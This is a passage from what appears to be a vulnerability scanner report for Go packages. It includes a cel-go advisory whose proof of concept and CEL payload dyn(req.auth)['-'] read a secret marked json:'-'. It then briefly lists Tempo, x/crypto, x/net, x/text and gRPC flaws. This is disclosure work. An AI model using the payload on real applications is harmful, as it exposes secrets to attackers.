│                       │     │                   // If the tag to parse is "json" and the struct field has tag
│                       │     │                    json:"foo,omitempty", the CEL struct field will be "foo".
│                       │     │                   func ParseStructTag(tag string) NativeTypesOption {
│                       │     │                       return func(ntp *nativeTypeOptions) error {
│                       │     │                           ntp.fieldNameHandler = fieldNameByTag(tag)
│                       │     │                           return nil
│                       │     │                   A developer using `ParseStructTag("json")` is therefore led
│                       │     │                   to expect `encoding/json` field-name semantics. Instead,
│                       │     │                   `json:"-"` is treated as a real field name.
│                       │     │                   The bad name is accepted during native type construction.
│                       │     │                   `newNativeType` checks for duplicate field names, but it does
│                       │     │                    not reject or skip empty names or skip sentinels.
│                       │     │                   See at `ext/native.go:663`:
│                       │     │                   if fieldNameHandler != nil {
│                       │     │                       fieldNames := make(map[string]struct{})
│                       │     │                       for idx := 0; idx < refType.NumField(); idx++ {
│                       │     │                           field := refType.Field(idx)
│                       │     │                           fieldName := toFieldName(fieldNameHandler, field)
│                       │     │                           if _, found := fieldNames[fieldName]; found {
│                       │     │                               return nil, fmt.Errorf("invalid field name `%s`
│                       │     │                   in struct `%s`: %w", fieldName, refType.Name(),
│                       │     │                   errDuplicatedFieldName)
│                       │     │                           } else {
│                       │     │                               fieldNames[fieldName] = struct{}{}
│                       │     │                   Once accepted, the field becomes part of CEL's view of the
│                       │     │                   type. Field enumeration reports it as a normal field name.
│                       │     │                   See at `ext/native.go:286`:
│                       │     │                   func (tp *nativeTypeProvider) FindStructFieldNames(typeName
│                       │     │                   string) ([]string, bool) {
│                       │     │                       if t, found := tp.nativeTypes[typeName]; found {
│                       │     │                           fieldCount := t.refType.NumField()
│                       │     │                           fields := make([]string, fieldCount)
│                       │     │                           for i := 0; i < fieldCount; i++ {
│                       │     │                               fields[i] =
│                       │     │                   toFieldName(tp.options.fieldNameHandler, t.refType.Field(i))
│                       │     │                           return fields, true
│                       │     │                       if celTypeFields, found :=
│                       │     │                   tp.baseProvider.FindStructFieldNames(typeName); found {
│                       │     │                           return celTypeFields, true
│                       │     │                       return tp.baseProvider.FindStructFieldNames(typeName)
│                       │     │                   Field lookup also treats the name as valid and returns the
│                       │     │                   underlying Go field value.
│                       │     │                   See at `ext/native.go:303`:
│                       │     │                   func (tp *nativeTypeProvider) FindStructFieldType(typeName,
│                       │     │                   fieldName string) (*types.FieldType, bool) {
│                       │     │                       t, found := tp.nativeTypes[typeName]
│                       │     │                       if !found {
│                       │     │                           return tp.baseProvider.FindStructFieldType(typeName,
│                       │     │                   fieldName)
│                       │     │                       refField, isDefined := t.hasField(fieldName)
│                       │     │                       if !found || !isDefined {
│                       │     │                           return nil, false
│                       │     │                       return &types.FieldType{
│                       │     │                           IsSet: func(obj any) bool {
│                       │     │                               refVal := reflect.Indirect(reflect.ValueOf(obj))
│                       │     │                               refField := refVal.FieldByName(refField.Name)
│                       │     │                               return !refField.IsZero()
│                       │     │                           },
│                       │     │                           GetFrom: func(obj any) (any, error) {
│                       │     │                               return getFieldValue(refField), nil
│                       │     │                       }, true
│                       │     │                   At runtime, native objects advertise index access.
│                       │     │                   See at `ext/native.go:37`:
│                       │     │                   var (
│                       │     │                       nativeObjTraitMask = traits.FieldTesterType |
│                       │     │                   traits.IndexerType
│                       │     │                   )
│                       │     │                   Because `traits.IndexerType` is present, a user expression
│                       │     │                   can bypass ordinary field syntax and read the registered
│                       │     │                   `"-"` field with bracket access:
│                       │     │                   ```cel
│                       │     │                   dyn(req.auth)["-"]
│                       │     │                   The same mistaken name is also used when converting native
│                       │     │                   objects to JSON-like CEL values.
│                       │     │                   `ConvertToNative(jsonStructType)` iterates all Go struct
│                       │     │                   fields, computes the CEL field name, and inserts it into the
│                       │     │                   output map without applying the JSON skip rule.
│                       │     │                   See at `ext/native.go:501`:
│                       │     │                   case jsonStructType:
│                       │     │                       refVal := reflect.Indirect(o.refValue)
│                       │     │                       refType := refVal.Type()
│                       │     │                       fields := make(map[string]*structpb.Value,
│                       │     │                   refVal.NumField())
│                       │     │                       for i := 0; i < refVal.NumField(); i++ {
│                       │     │                           fieldType := refType.Field(i)
│                       │     │                           fieldValue := refVal.Field(i)
│                       │     │                           if !fieldValue.IsValid() || fieldValue.IsZero() {
│                       │     │                               continue
│                       │     │                           fieldName := toFieldName(o.valType.fieldNameHandler,
│                       │     │                   fieldType)
│                       │     │                           fieldCELVal :=
│                       │     │                   o.NativeToValue(fieldValue.Interface())
│                       │     │                           fieldJSONVal, err :=
│                       │     │                   fieldCELVal.ConvertToNative(jsonValueType)
│                       │     │                           if err != nil {
│                       │     │                               return nil, err
│                       │     │                           fields[fieldName] = fieldJSONVal.(*structpb.Value)
│                       │     │                       return &structpb.Struct{Fields: fields}, nil
│                       │     │                   This means a `json:"-"` secret is exposed in two ways: it can
│                       │     │                    be read directly through CEL indexing as `dyn(obj)["-"]`,
│                       │     │                   and it can appear under the key `"-"` in JSON struct
│                       │     │                   conversion output.
│                       │     │                   The blast radius is widened by `newNativeTypes`, which
│                       │     │                   registers not only the type explicitly passed to
│                       │     │                   `NativeTypes`, but also every nested struct reachable from
│                       │     │                   its fields.
│                       │     │                   See at `ext/native.go:609`:
│                       │     │                   func newNativeTypes(fieldNameHandler
│                       │     │                   NativeTypesFieldNameHandler, rawType reflect.Type)
│                       │     │                   ([]*nativeType, error) {
│                       │     │                       nt, err := newNativeType(fieldNameHandler, rawType)
│                       │     │                       if err != nil {
│                       │     │                           return nil, err
│                       │     │                       result := []*nativeType{nt}
│                       │     │                       var iterateStructMembers func(reflect.Type)
│                       │     │                       iterateStructMembers = func(t reflect.Type) {
│                       │     │                           if k := t.Kind(); k == reflect.Pointer || k ==
│                       │     │                   reflect.Slice || k == reflect.Array || k == reflect.Map {
│                       │     │                               iterateStructMembers(t.Elem())
│                       │     │                               return
│                       │     │                           if t.Kind() != reflect.Struct {
│                       │     │                           nt, ntErr := newNativeType(fieldNameHandler, t)
│                       │     │                           if ntErr != nil {
│                       │     │                               err = ntErr
│                       │     │                           result = append(result, nt)
│                       │     │                           for idx := 0; idx < t.NumField(); idx++ {
│                       │     │                               iterateStructMembers(t.Field(idx).Type)
│                       │     │                       iterateStructMembers(rawType)
│                       │     │                       return result, err
│                       │     │                   As a result, a developer can register one apparently safe
│                       │     │                   request type while a nested dependency type is silently
│                       │     │                   registered too. If that nested type contains a `json:"-"`
│                       │     │                   secret, CEL still receives a readable field named `"-"` even
│                       │     │                   though the developer never registered or audited that nested
│                       │     │                   type directly.
│                       │     │                   ## Reproduction
│                       │     │                   package main
│                       │     │                   import (
│                       │     │                       "fmt"
│                       │     │                       "reflect"
│                       │     │                       "github.com/google/cel-go/cel"
│                       │     │                       "github.com/google/cel-go/ext"
│                       │     │                   // Simulates a library type; developer never registers this
│                       │     │                   directly.
│                       │     │                   type AuthCtx struct {
│                       │     │                       UserID string `json:"userId"`
│                       │     │                       Secret string `json:"-"` // server-internal; never
│                       │     │                   appears in JSON output
│                       │     │                   // Developer registers only this type.
│                       │     │                   type Req struct{ Auth AuthCtx `json:"auth"` }
│                       │     │                   func main() {
│                       │     │                       env, _ := cel.NewEnv(
│                       │     │                           // Only Req is passed; AuthCtx is registered silently
│                       │     │                    by newNativeTypes.
│                       │     │                           ext.NativeTypes(reflect.TypeOf(Req{}),
│                       │     │                   ext.ParseStructTag("json")),
│                       │     │                           cel.Variable("req", cel.ObjectType("main.Req")),
│                       │     │                       )
│                       │     │                       ast, _ := env.Compile(`dyn(req.auth)["-"]`)
│                       │     │                       prg, _ := env.Program(ast)
│                       │     │                       out, _, _ := prg.Eval(map[string]any{
│                       │     │                           "req": Req{Auth: AuthCtx{UserID: "alice", Secret:
│                       │     │                   "sk-live-s3cr3t"}},
│                       │     │                       })
│                       │     │                       fmt.Println(out) // sk-live-s3cr3t
│                       │     │                   **Expected:** expression compile error or empty result;
│                       │     │                   `json:"-"` field should not be
│                       │     │                   accessible.  
│                       │     │                   **Actual:** `sk-live-s3cr3t`; the server-injected secret is
│                       │     │                   returned verbatim.
│                       │     │                   The same field is also included under key `"-"` in
│                       │     │                   `ConvertToNative(jsonStructType)`
│                       │     │                   output, and appears in `FindStructFieldNames` enumeration.
│                       │     │                   ### path 1. CEL indexing
│                       │     │                   Tested against the released module `github.com/google/cel-go
│                       │     │                   v0.28.1`
│                       │     │                   (latest stable release as of 2026-05-12), using the `go.mod`
│                       │     │                   entry:
│                       │     │                   require github.com/google/cel-go v0.28.1
│                       │     │                   Running the PoC above (`go run main.go`) produces:
│                       │     │                   sk-live-s3cr3t
│                       │     │                   The secret value is returned verbatim, with no error at
│                       │     │                   compile time or at runtime.
│                       │     │                   ### Path 2. `ConvertToNative(jsonStructType)`
│                       │     │                   When the `nativeObj` for the `AuthCtx` value is converted to
│                       │     │                   a Protobuf `Struct`
│                       │     │                   (the representation used whenever CEL output is serialised to
│                       │     │                    JSON), the
│                       │     │                   `json:"-"` field appears in the output map under the key
│                       │     │                   `"-"`.
│                       │     │                       "encoding/json"
│                       │     │                       structpb
│                       │     │                   "google.golang.org/protobuf/types/known/structpb"
│                       │     │                   type AuthCtxConv struct {
│                       │     │                       Secret string `json:"-"` // should never appear in JSON
│                       │     │                   output
│                       │     │                   type ReqConv struct{ Auth AuthCtxConv `json:"auth"` }
│                       │     │                           ext.NativeTypes(reflect.TypeOf(ReqConv{}),
│                       │     │                           cel.Variable("req", cel.ObjectType("main.ReqConv")),
│                       │     │                       ast, _ := env.Compile(`req.auth`)
│                       │     │                           "req": ReqConv{Auth: AuthCtxConv{UserID: "alice",
│                       │     │                   Secret: "sk-live-s3cr3t"}},
│                       │     │                       jsonStructType := reflect.TypeOf(&structpb.Struct{})
│                       │     │                       raw, _ := out.ConvertToNative(jsonStructType)
│                       │     │                       st := raw.(*structpb.Struct)
│                       │     │                       b, _ := json.MarshalIndent(st.AsMap(), "", "  ")
│                       │     │                       fmt.Printf("ConvertToNative(jsonStructType)
│                       │     │                   output:\n%s\n", b)
│                       │     │                       fmt.Printf("\nDirect field access via \"-\" key present:
│                       │     │                   %v\n", st.Fields["-"] != nil)
│                       │     │                       if v, ok := st.Fields["-"]; ok {
│                       │     │                           fmt.Printf("Value: %s\n", v.GetStringValue())
│                       │     │                   Running the PoC above produces:
│                       │     │                   ConvertToNative(jsonStructType) output:
│                       │     │                   {
│                       │     │                     "-": "sk-live-s3cr3t",
│                       │     │                     "userId": "alice"
│                       │     │                   Direct field access via "-" key present: true
│                       │     │                   Value: sk-live-s3cr3t
│                       │     │                   The `"-"` key is present in the serialised Protobuf struct
│                       │     │                   alongside `userId`.
│                       │     │                   Any system that converts a CEL evaluation result to JSON
│                       │     │                   (e.g. via `structpb.Struct`) will include the secret in the
│                       │     │                   output, regardless of whether the `dyn()["-"]` indexing path
│                       │     │                   is used.
│                       │     │                   ## Impact
│                       │     │                   Any user who can submit CEL expressions to an application
│                       │     │                   that uses `ext.NativeTypes(ParseStructTag("json"))` can read
│                       │     │                   struct fields that the developer explicitly marked `json:"-"`
│                       │     │                    to keep out of serialised output. By writing
│                       │     │                   `dyn(obj)["-"]`, the attacker retrieves the raw Go field
│                       │     │                   value, typically a secret, internal token, or private
│                       │     │                   identifier, with no compile-time or runtime error. Because
│                       │     │                   `newNativeTypes` silently registers every nested struct
│                       │     │                   reachable from the root type, the attacker may also reach
│                       │     │                   secrets in dependency types the developer never intended to
│                       │     │                   expose to CEL.
│                       │     │                   ## Remediation
│                       │     │                   Do not treat `json:"-"` as a CEL field named `"-"`. Model it
│                       │     │                   as an explicit skipped field, not as an empty string field
│                       │     │                   name.
│                       │     │                   Update the struct-tag parsing path so exact `json:"-"`
│                       │     │                   returns “skip this field”, while `json:"-,"` continues to
│                       │     │                   mean the literal field name `"-"`, matching `encoding/json`
│                       │     │                   semantics.
│                       │     │                   Apply that skip decision consistently anywhere native fields
│                       │     │                   are exposed or resolved:
│                       │     │                   - duplicate-name validation in `newNativeType`
│                       │     │                   - field enumeration in `FindStructFieldNames`
│                       │     │                   - field type lookup in `FindStructFieldType`
│                       │     │                   - runtime lookup in `fieldByName` / `hasField`
│                       │     │                   - object construction in `NewValue`
│                       │     │                   - JSON conversion in `ConvertToNative(jsonStructType)`
│                       │     │                   Apply the same omit handling for `xml:"-"`, `yaml:"-"`, and
│                       │     │                   `bson:"-"` where `ParseStructTag` is used. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ VendorSeverity   ─ ghsa: 2 
│                       │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:
│                       │     │                         │            N/VA:N/SC:N/SI:N/SA:N 
│                       │     │                         ╰ V40Score : 6.3 
│                       │     ├ References       ╭ [0]: https://github.com/cel-expr/cel-go 
│                       │     │                  ╰ [1]: https://github.com/cel-expr/cel-go/security/advisories/
│                       │     │                         GHSA-gcjh-h69q-9w9g 
│                       │     ├ PublishedDate   : 2026-07-24T16:48:56Z 
│                       │     ╰ LastModifiedDate: 2026-07-24T16:48:56Z 
│                       ├ [3] ╭ VulnerabilityID : CVE-2026-21728 
│                       │     ├ VendorIDs        ─ [0]: GHSA-p4r4-xvrq-gvmc 
│                       │     ├ PkgID           : github.com/grafana/tempo@v1.5.1-0.20260427112133-525d1bab07e0 
│                       │     ├ PkgName         : github.com/grafana/tempo 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/grafana/tempo@v1.5.1-0.202604271
│                       │     │                  │       12133-525d1bab07e0 
│                       │     │                  ╰ UID : 18b157406ef90a65 
│                       │     ├ InstalledVersion: v1.5.1-0.20260427112133-525d1bab07e0 
│                       │     ├ FixedVersion    : 2.8.4, 2.9.2, 2.10.2 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-21728 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:1b4ee481166e2574723ea1a5abd4bb9e34001c2f1eb12e51fdd822
│                       │     │                   3f0acee10a 
│                       │     ├ Title           : grafana/tempo: Tempo: Denial of Service via large queries 
│                       │     ├ Description     : Tempo queries with large limits can cause large memory
│                       │     │                   allocations which can impact the availability of the service,
│                       │     │                    depending on its deployment strategy.
│                       │     │                   
│                       │     │                   Mitigation can be done by setting max_result_limit in the
│                       │     │                   search config, e.g. to 262144 (2^18). Alternatively,
│                       │     │                   automatically restart the service. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ╭ [0]: CWE-400 
│                       │     │                  ╰ [1]: CWE-770 
│                       │     ├ VendorSeverity   ╭ ghsa  : 3 
│                       │     │                  ╰ redhat: 3 
│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
│                       │     │                  │        │           A:H 
│                       │     │                  │        ╰ V3Score : 7.5 
│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
│                       │     │                           │           A:H 
│                       │     │                           ╰ V3Score : 7.5 
│                       │     ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:21769 
│                       │     │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:22347 
│                       │     │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:22423 
│                       │     │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:23345 
│                       │     │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:24503 
│                       │     │                  ├ [5] : https://access.redhat.com/security/cve/CVE-2026-21728 
│                       │     │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2461395 
│                       │     │                  ├ [7] : https://github.com/grafana/tempo 
│                       │     │                  ├ [8] : https://github.com/grafana/tempo/blob/4dc3e5b0d3463a0b
│                       │     │                  │       67498b662b85a148698b4afd/docs/sources/tempo/release-no
│                       │     │                  │       tes/version-2/v2-10.md?plain=1#L328 
│                       │     │                  ├ [9] : https://github.com/grafana/tempo/blob/4dc3e5b0d3463a0b
│                       │     │                  │       67498b662b85a148698b4afd/docs/sources/tempo/release-no
│                       │     │                  │       tes/version-2/v2-8.md?plain=1#L251 
│                       │     │                  ├ [10]: https://github.com/grafana/tempo/blob/4dc3e5b0d3463a0b
│                       │     │                  │       67498b662b85a148698b4afd/docs/sources/tempo/release-no
│                       │     │                  │       tes/version-2/v2-9.md?plain=1#L224 
│                       │     │                  ├ [11]: https://github.com/grafana/tempo/commit/650eb1985a0776
│                       │     │                  │       789c8564122990f588a742356f 
│                       │     │                  ├ [12]: https://github.com/grafana/tempo/pull/6525 
│                       │     │                  ├ [13]: https://grafana.com/security/security-advisories/cve-2
│                       │     │                  │       026-21728 
│                       │     │                  ├ [14]: https://nvd.nist.gov/vuln/detail/CVE-2026-21728 
│                       │     │                  ├ [15]: https://security.access.redhat.com/data/csaf/v2/vex/20
│                       │     │                  │       26/cve-2026-21728.json 
│                       │     │                  ╰ [16]: https://www.cve.org/CVERecord?id=CVE-2026-21728 
│                       │     ├ PublishedDate   : 2026-04-24T09:16:03.71Z 
│                       │     ╰ LastModifiedDate: 2026-07-27T13:16:58.34Z 
│                       ├ [4] ╭ VulnerabilityID : CVE-2026-28377 
│                       │     ├ VendorIDs        ─ [0]: GHSA-ffqx-q65f-36jf 
│                       │     ├ PkgID           : github.com/grafana/tempo@v1.5.1-0.20260427112133-525d1bab07e0 
│                       │     ├ PkgName         : github.com/grafana/tempo 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/github.com/grafana/tempo@v1.5.1-0.202604271
│                       │     │                  │       12133-525d1bab07e0 
│                       │     │                  ╰ UID : 18b157406ef90a65 
│                       │     ├ InstalledVersion: v1.5.1-0.20260427112133-525d1bab07e0 
│                       │     ├ FixedVersion    : 2.10.3 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-28377 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Go 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Ago 
│                       │     ├ Fingerprint     : sha256:d3045f258b228bc260aeae30f8f77f38b6c625cfd351a164153c21
│                       │     │                   75e9b5f2b8 
│                       │     ├ Title           : Grafana Tempo: Grafana Tempo: Information disclosure of S3
│                       │     │                   encryption key via status config endpoint 
│                       │     ├ Description     : A vulnerability in Grafana Tempo exposes the S3 SSE-C
│                       │     │                   encryption key in plaintext through the /status/config
│                       │     │                   endpoint, potentially allowing unauthorized users to obtain
│                       │     │                   the key used to encrypt trace data stored in S3.
│                       │     │                   
│                       │     │                   Thanks to william_goodfellow for reporting this
│                       │     │                   vulnerability. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-326 
│                       │     ├ VendorSeverity   ╭ ghsa  : 3 
│                       │     │                  ╰ redhat: 2 
│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/
│                       │     │                  │        │           A:N 
│                       │     │                  │        ╰ V3Score : 7.5 
│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/
│                       │     │                           │           A:N 
│                       │     │                           ╰ V3Score : 6.5 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-28377 
│                       │     │                  ├ [1]: https://github.com/advisories/GHSA-ffqx-q65f-36jf 
│                       │     │                  ├ [2]: https://github.com/grafana/tempo 
│                       │     │                  ├ [3]: https://github.com/grafana/tempo/blob/4dc3e5b0d3463a0b6
│                       │     │                  │      7498b662b85a148698b4afd/CHANGELOG.md?plain=1#L135 
│                       │     │                  ├ [4]: https://github.com/grafana/tempo/commit/bb8ca663db34a09
│                       │     │                  │      80c9758b40d918fda3b4dbec3 
│                       │     │                  ├ [5]: https://grafana.com/security/security-advisories/cve-20
│                       │     │                  │      26-28377 
│                       │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-28377 
│                       │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-28377 
│                       │     ├ PublishedDate   : 2026-03-26T22:16:28.46Z 
│                       │     ╰ LastModifiedDate: 2026-06-17T13:20:14.76Z 
│                       ├ [5] ╭ VulnerabilityID : GO-2026-5932 
│                       │     ├ PkgID           : golang.org/x/crypto@v0.52.0 
│                       │     ├ PkgName         : golang.org/x/crypto 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.52.0 
│                       │     │                  ╰ UID : ed1a6850b8ba8c85 
│                       │     ├ InstalledVersion: v0.52.0 
│                       │     ├ Status          : affected 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:1fffec94967fc2316488f2ed6f1c898c414ccd3ecfd4059c47c9eb
│                       │     │                   567947b9e8 
│                       │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained,
│                       │     │                   unsafe by design, and has known security issues 
│                       │     ├ Description     : The golang.org/x/crypto/openpgp package is unsafe by design,
│                       │     │                   has numerous known security issues, is not maintained, and
│                       │     │                   should not be used.
│                       │     │                   
│                       │     │                   If you are required to interoperate with OpenPGP systems and
│                       │     │                   need a maintained package, consider
│                       │     │                   github.com/ProtonMail/go-crypto/openpgp which is a maintained
│                       │     │                    fork that aims to be a drop-in replacement for this
│                       │     │                   package. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ╰ References       ╭ [0]: https://go.dev/issue/44226 
│                       │                        ╰ [1]: https://pkg.go.dev/vuln/GO-2026-5932 
│                       ├ [6] ╭ VulnerabilityID : CVE-2026-46600 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5942 
│                       │     ├ PkgID           : golang.org/x/net@v0.55.0 
│                       │     ├ PkgName         : golang.org/x/net 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/net@v0.55.0 
│                       │     │                  ╰ UID : 3762bd4e34baa6ce 
│                       │     ├ InstalledVersion: v0.55.0 
│                       │     ├ FixedVersion    : 0.56.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46600 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:6c49c04fc92b93c610bfa0e43c7124d040562abc37296e56cb5762
│                       │     │                   4bfd1bd3db 
│                       │     ├ Title           : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a param ... 
│                       │     ├ Description     : Parsing an invalid SVCB or HTTPS RR can panic when the size
│                       │     │                   of a parameter value overflows the message buffer. 
│                       │     ├ Severity        : UNKNOWN 
│                       │     ├ CweIDs           ─ [0]: CWE-125 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/786345 
│                       │     │                  ├ [1]: https://go.dev/issue/79795 
│                       │     │                  ╰ [2]: https://pkg.go.dev/vuln/GO-2026-5942 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:01.213Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ├ [7] ╭ VulnerabilityID : CVE-2026-56852 
│                       │     ├ VendorIDs        ─ [0]: GO-2026-5970 
│                       │     ├ PkgID           : golang.org/x/text@v0.37.0 
│                       │     ├ PkgName         : golang.org/x/text 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/text@v0.37.0 
│                       │     │                  ╰ UID : f5591d8a5f651e8f 
│                       │     ├ InstalledVersion: v0.37.0 
│                       │     ├ FixedVersion    : 0.39.0 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-56852 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:8679aff140f797ea84b3e23c589f70d301eb59709ea35bd69b7ad0
│                       │     │                   9a37acde61 
│                       │     ├ Title           : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing  ... 
│                       │     ├ Description     : A norm.Iter can enter an infinite loop when handling input
│                       │     │                   containing invalid UTF-8 bytes. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ CweIDs           ─ [0]: CWE-835 
│                       │     ├ VendorSeverity   ─ azure: 3 
│                       │     ├ References       ╭ [0]: https://go.dev/cl/794100 
│                       │     │                  ├ [1]: https://go.dev/issue/80142 
│                       │     │                  ├ [2]: https://nvd.nist.gov/vuln/detail/CVE-2026-56852 
│                       │     │                  ╰ [3]: https://pkg.go.dev/vuln/GO-2026-5970 
│                       │     ├ PublishedDate   : 2026-07-21T20:17:02.867Z 
│                       │     ╰ LastModifiedDate: 2026-07-23T18:27:48.877Z 
│                       ╰ [8] ╭ VulnerabilityID : GHSA-hrxh-6v49-42gf 
│                             ├ PkgID           : google.golang.org/grpc@v1.81.1 
│                             ├ PkgName         : google.golang.org/grpc 
│                             ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.81.1 
│                             │                  ╰ UID : f8bbc19acb5c3986 
│                             ├ InstalledVersion: v1.81.1 
│                             ├ FixedVersion    : 1.82.1 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                             │                  │         6997c001601e2a6e5af 
│                             │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                             │                            e154f0b8ad928e980c9 
│                             ├ SeveritySource  : ghsa 
│                             ├ PrimaryURL      : https://github.com/advisories/GHSA-hrxh-6v49-42gf 
│                             ├ DataSource       ╭ ID  : ghsa 
│                             │                  ├ Name: GitHub Security Advisory Go 
│                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                             │                          osystem%3Ago 
│                             ├ Fingerprint     : sha256:4bdd6808a0ff3132a719cb4a43c36a94113b82e1d8d6c40a624418
│                             │                   082cecffbf 
│                             ├ Title           : gRPC-Go: xDS RBAC and HTTP/2 Vulnerabilities 
│                             ├ Description     : Multiple security vulnerabilities have been identified and
│                             │                   addressed in grpc-go affecting the xDS RBAC authorization
│                             │                   engine (internal/xds/rbac) and the HTTP/2 transport server
│                             │                   implementation (internal/transport). These vulnerabilities
│                             │                   could result in:
│                             │                   
│                             │                   - Authorization Bypass (Fail-Open) when translating xDS RBAC
│                             │                   policies containing `Metadata` or `RequestedServerName`
│                             │                   fields.
│                             │                   - Denial of Service (High CPU Consumption) due to an HTTP/2
│                             │                   Rapid Reset mitigation bypass during client-initiated stream
│                             │                   resets.
│                             │                   - Denial of Service (Server Panic) when parsing crafted xDS
│                             │                   RBAC policies containing `NOT` rules around unsupported
│                             │                   ### Impact
│                             │                   _What kind of vulnerability is it? Who is impacted?_
│                             │                   #### xDS RBAC Authorization Bypass via `Metadata` &
│                             │                   `RequestedServerName` matchers
│                             │                   - Affected Component: xDS RBAC 
│                             │                   - Impact: When building policy matchers for gRPC RBAC from
│                             │                   xDS configurations, unsupported `permission` and `principal`
│                             │                   rules (specifically `Metadata` and `RequestedServerName`)
│                             │                   were silently ignored and treated as no-ops.
│                             │                     - If an authorization policy relied purely on these
│                             │                   matchers for access control, treating those rules as no-ops
│                             │                   effectively removed the restrictions.
│                             │                   - If these unsupported rules were nested inside logical `NOT`
│                             │                    rules (`Permission_NotRule` / `Principal_NotId`) or
│                             │                   multi-condition `OR/AND` rules, silently dropping them
│                             │                   changed the boolean logic flow of the authorization engine.
│                             │                   As a result, policy evaluation decisions could fail open,
│                             │                   allowing unauthorized clients to access protected gRPC
│                             │                   services or resources.
